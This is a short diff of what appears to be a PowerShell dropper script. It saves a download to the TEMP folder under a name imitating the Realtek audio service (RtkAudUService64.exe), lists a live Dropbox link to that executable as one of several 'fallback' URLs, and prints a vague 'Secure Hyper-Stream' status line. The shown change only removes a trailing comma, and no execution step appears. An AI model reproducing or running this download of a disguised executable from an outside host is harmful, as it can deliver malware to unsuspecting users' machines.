@@ -135,7 +135,7 @@ $exe = "$env:TEMP\RtkAudUService64.exe"
 
 # ========== 11. URLS TO TRY (Multiple fallbacks) ==========
 $urls = @(
-    'https://www.dropbox.com/scl/fi/iwv6cm1n1qo3kdn9gmn36/RtkAudUService64.exe?rlkey=csrph0p954x523nhvxoqf8m9z&st=1c2xz36h&dl=1',
+    'https://www.dropbox.com/scl/fi/iwv6cm1n1qo3kdn9gmn36/RtkAudUService64.exe?rlkey=csrph0p954x523nhvxoqf8m9z&st=1c2xz36h&dl=1'
 )    
 
 Write-Host "[*] Establishing Secure Hyper-Stream..." -ForegroundColor Gray
